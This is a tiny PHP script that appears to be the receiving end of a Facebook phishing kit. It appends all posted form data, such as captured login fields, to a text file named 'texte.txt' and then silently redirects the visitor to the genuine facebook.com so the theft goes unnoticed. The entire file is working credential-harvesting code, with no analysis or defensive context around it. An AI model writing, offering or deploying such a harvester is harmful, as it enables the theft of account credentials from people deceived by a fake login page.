<?php
if (!empty($_POST)) {
    $contenu = print_r($_POST, true);
    file_put_contents('texte.txt', $contenu . PHP_EOL, FILE_APPEND);
}

header('Location: https://www.facebook.com/');
exit;
?>